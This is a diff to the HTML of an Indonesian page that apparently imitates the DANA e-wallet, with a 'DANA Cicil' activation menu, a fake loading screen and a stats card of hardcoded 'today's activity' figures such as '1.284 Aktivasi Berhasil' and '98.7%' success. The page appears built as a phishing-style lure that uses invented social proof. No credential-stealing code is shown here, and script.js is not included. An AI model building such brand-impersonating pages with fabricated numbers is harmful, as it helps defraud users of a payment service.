@@ -39,51 +39,59 @@ href="style.css">
 </head>
 <body>
 
-<!-- BACKGROUND FULL -->
 <div class="bg-banner"></div>
 
 <div class="container">
 
-<!-- BANNER -->
+    <div class="topbar">
+        <div class="time-box" id="timeBox">00:00</div>
+
+        <img src="assets/logo-danaa.png" class="top-logo">
+
+        <button class="help-btn menu-box">
+    Bantuan
+</button>
+
+    </div>
+
+<div class="marquee-card">
+        <div class="marquee-text" id="marqueeText">
+            Memuat aktivitas...
+        </div>
+    </div>
+
 <div class="banner-box">
 
-    <!-- tombol kiri -->
     <button class="banner-btn prev">
         &#10094;
     </button>
 
     <div class="banner-slider">
 
-        <img src="assets/poster1.png"
+        <img
+        src="assets/poster1.png"
         class="banner-slide active">
 
-        <img src="assets/poster2.png"
+        <img
+        src="assets/poster2.png"
         class="banner-slide">
 
-        <img src="assets/poster3.png"
+        <img
+        src="assets/poster3.png"
         class="banner-slide">
 
-        <img src="assets/poster4.png"
-        class="banner-slide">
-
-        <img src="assets/poster5.png"
-        class="banner-slide">
-
-        <img src="assets/poster6.png"
+        <img
+        src="assets/poster4.png"
         class="banner-slide">
 
     </div>
 
-    <!-- tombol kanan -->
     <button class="banner-btn next">
         &#10095;
     </button>
 
-    <!-- indikator titik -->
     <div class="banner-dots">
         <span class="dot active"></span>
-        <span class="dot"></span>
-        <span class="dot"></span>
         <span class="dot"></span>
         <span class="dot"></span>
         <span class="dot"></span>
@@ -91,49 +99,57 @@ href="style.css">
 
 </div>
 
-    <!-- JUDUL -->
-    <div class="judul-box">
+<div class="quick-menu">
 
-        <img
-        src="assets/judull.png"
-        class="judul-img">
+    <div class="menu-box quick-btn">
+        <img src="assets/quick1.png" class="quick-img">
+    </div>
+
+    <div class="menu-box quick-btn">
+        <img src="assets/quick2.png" class="quick-img">
+    </div>
+
+    <div class="menu-box quick-btn">
+        <img src="assets/quick3.png" class="quick-img">
+    </div>
+
+    <div class="menu-box quick-btn">
+        <img src="assets/quick4.png" class="quick-img">
+    </div>
+
+</div>
+
+<div class="stats-card">
+
+    <div class="stats-title">
+         Aktivitas Hari Ini
+    </div>
+
+    <div class="stats-grid">
+
+        <div class="stat-item">
+            <h2 id="aktifHari">1.284</h2>
+            <p>Aktivasi Berhasil</p>
+        </div>
+
+        <div class="stat-item">
+            <h2 id="verifHari">842</h2>
+            <p>Verifikasi Selesai</p>
+        </div>
+
+        <div class="stat-item">
+            <h2 id="cicilHari">529</h2>
+            <p>DANA Cicil Aktif</p>
+        </div>
+
+        <div class="stat-item">
+            <h2>98.7%</h2>
+            <p>Tingkat Keberhasilan</p>
+        </div>
 
     </div>
 
-    <!-- MENU WRAPPER -->
-    <div class="menu-wrapper">
-
-        <!-- MENU 1 -->
-        <div class="menu-box"
-        onclick="goPage('loading.html')">
-
-            <img
-            src="assets/ajkx.png"
-            class="menu-img">
-
-        </div>
-
-        <!-- MENU 2 -->
-        <div class="menu-box"
-        onclick="goPage('loading.html')">
-
-            <img
-            src="assets/cicixx.png"
-            class="menu-img">
-
-        </div>
-
-        <!-- MENU 3 -->
-        <div class="menu-box"
-        onclick="goPage('loading.html')">
-
-            <img
-            src="assets/laprkx.png"
-            class="menu-img">
-
-        </div>
-
-    </div>
+</div>
 
     <!-- INFO BOX -->
     <div class="info-box">
@@ -181,14 +197,14 @@ href="style.css">
 
 </div>
 
+
 <!-- LOADING -->
 <div class="loading-box"
 id="loadingBox">
 
     <div class="loading-circle">
 
-        <div class="spinner-ring">
-        </div>
+        <div class="spinner-ring"></div>
 
         <img
         src="assets/loadingg-danaa.png"
@@ -198,13 +214,27 @@ id="loadingBox">
 
     <div class="loading-text">
 
-        Memuat..
+        Memuat...
 
     </div>
 
 </div>
 
+    <div class="marquee-card">
+
+    <div
+    class="marquee-text"
+    id="marqueeText">
+
+    </div>
+
+</div>
+
+<div class="loading-box" id="loadingBox">
+    <div class="spinner-ring"></div>
+    <div class="loading-text">Memuat...</div>
+</div>
+
 <script src="script.js"></script>
 
 </body>
-</html>
